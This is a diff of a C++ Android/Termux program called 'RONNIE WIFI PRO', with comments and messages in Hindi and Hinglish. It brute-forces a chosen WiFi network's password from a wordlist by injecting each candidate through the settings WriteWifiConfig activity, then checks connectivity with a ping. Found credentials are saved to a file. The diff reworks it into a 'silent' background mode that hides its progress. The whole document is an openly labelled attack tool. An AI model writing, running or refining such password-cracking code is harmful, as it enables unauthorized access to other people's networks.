@@ -12,17 +12,16 @@ using namespace std;
 #define CYAN    "\033[36m"
 #define BOLD    "\033[1m"
 
-// इंटरनेट चेक करने का सबसे सटीक तरीका
+// इंटरनेट चेक करने का फंक्शन (Silent)
 bool isConnected() {
-    // 3 बार पिंग करके सुनिश्चित करें कि कनेक्शन स्टेबल है
-    int res = system("ping -c 2 -W 3 8.8.8.8 > /dev/null 2>&1");
+    int res = system("ping -c 1 -W 2 8.8.8.8 > /dev/null 2>&1");
     return (res == 0);
 }
 
 int main() {
     system("clear");
     cout << CYAN << BOLD << "===========================================" << endl;
-    cout << "      RONNIE WIFI PRO (SUCCESS FIX)        " << endl;
+    cout << "      RONNIE WIFI PRO (SILENT MODE)        " << endl;
     cout << "===========================================" << RESET << endl;
 
     string ssid, wordlist;
@@ -35,12 +34,12 @@ int main() {
     cout << CYAN << "Wordlist Path: " << RESET;
     getline(cin, wordlist);
 
-    cout << CYAN << "Sleep Time (Recommended: 12-15s): " << RESET;
+    cout << CYAN << "Wait Time (Seconds): " << RESET;
     cin >> sleepTime;
 
     ifstream file(wordlist.c_str());
     if (!file.is_open()) {
-        cout << RED << "[-] Error: Wordlist nahi mili!" << RESET << endl;
+        cout << RED << "[-] Error: Wordlist file nahi mili!" << RESET << endl;
         return 1;
     }
 
@@ -48,7 +47,7 @@ int main() {
     int line_count = 0;
     bool success = false;
 
-    cout << YELLOW << "\n[*] Attack Started... Mobile Data OFF rakhein!" << RESET << endl;
+    cout << YELLOW << "\n[*] Attack Started in Background Mode..." << RESET << endl;
     cout << "-------------------------------------------" << endl;
 
     while (getline(file, pass)) {
@@ -57,39 +56,39 @@ int main() {
         if (!pass.empty() && (pass.back() == '\r' || pass.back() == '\n')) pass.pop_back();
         if (pass.length() < 8) continue;
 
-        cout << CYAN << "[" << line_count << "] TRYING: " << pass << flush;
+        // टर्मिनल को साफ़ रखने के लिए सिर्फ प्रोग्रेस दिखाएँ
+        cout << "\r" << YELLOW << "[TRYING Line: " << line_count << "] " << RESET << "Checking..." << flush;
 
-        // 1. वाई-फाई को एक बार 'Disable/Enable' करने का संकेत देना (Non-root trick)
-        // यह पुराने गलत पासवर्ड के कैश को साफ करने में मदद करता है
-        system("am start -a android.settings.WIFI_SETTINGS > /dev/null 2>&1");
-        usleep(500000); // 0.5s gap
-
-        // 2. नया पासवर्ड इंजेक्ट करना
-        string cmd = "am start -a android.intent.action.MAIN -n com.android.settings/.wifi.WriteWifiConfig --es ssid \"" + ssid + "\" --es password \"" + pass + "\" > /dev/null 2>&1";
+        /* 
+           Background Method: 
+           हम '--user 0' का उपयोग करके इसे सिस्टम लेवल पर भेजने की कोशिश करेंगे 
+           ताकि सेटिंग्स बार-बार पॉप-अप न हो।
+        */
+        string cmd = "am start-activity --user 0 -n com.android.settings/.wifi.WriteWifiConfig --es ssid \"" + ssid + "\" --es password \"" + pass + "\" > /dev/null 2>&1";
         system(cmd.c_str());
 
-        // 3. इंतज़ार करें ताकि वाई-फाई ऑथेंटिकेशन पूरा हो सके
+        // वेट टाइम के दौरान डॉट प्रिंट करें
         for(int i = 0; i < sleepTime; i++) {
-            cout << "." << flush;
-            sleep(1);
+            usleep(1000000); 
         }
 
         if (isConnected()) {
-            cout << GREEN << BOLD << " >> [SUCCESS!]" << RESET << endl;
-            cout << GREEN << BOLD << "\n[+] SAHI PASSWORD MIL GAYA: " << pass << RESET << endl;
+            cout << GREEN << BOLD << "\n\n===========================================" << endl;
+            cout << "[+] SUCCESS! SAHI PASSWORD MIL GAYA" << endl;
+            cout << "[+] SSID: " << ssid << endl;
+            cout << "[+] PASSWORD: " << pass << endl;
+            cout << "===========================================" << RESET << endl;
             
             ofstream save("found_pass.txt", ios::app);
             save << "SSID: " << ssid << " | PASS: " << pass << endl;
             save.close();
             
             success = true;
-            break; // सही पासवर्ड मिलते ही रुक जाएगा
-        } else {
-            cout << RED << " >> [FAILED]" << RESET << endl;
+            break; 
         }
     }
 
-    if (!success) cout << RED << "\n[-] Wordlist khatam. Sahi password nahi mila." << RESET << endl;
+    if (!success) cout << RED << "\n\n[-] Wordlist khatam. Password nahi mila." << RESET << endl;
 
     file.close();
     return 0;
